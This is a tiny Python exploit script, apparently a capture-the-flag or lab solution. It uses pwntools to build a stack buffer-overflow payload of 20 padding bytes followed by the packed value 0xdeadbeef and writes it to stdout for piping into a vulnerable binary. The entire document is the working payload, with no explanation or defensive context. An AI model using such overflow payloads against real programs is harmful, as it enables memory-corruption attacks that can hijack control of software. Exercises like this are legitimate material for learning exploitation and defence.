import sys
from pwn import *

payload = b'a'*20
payload += p32(0xdeadbeef)

sys.stdout.buffer.write(payload)
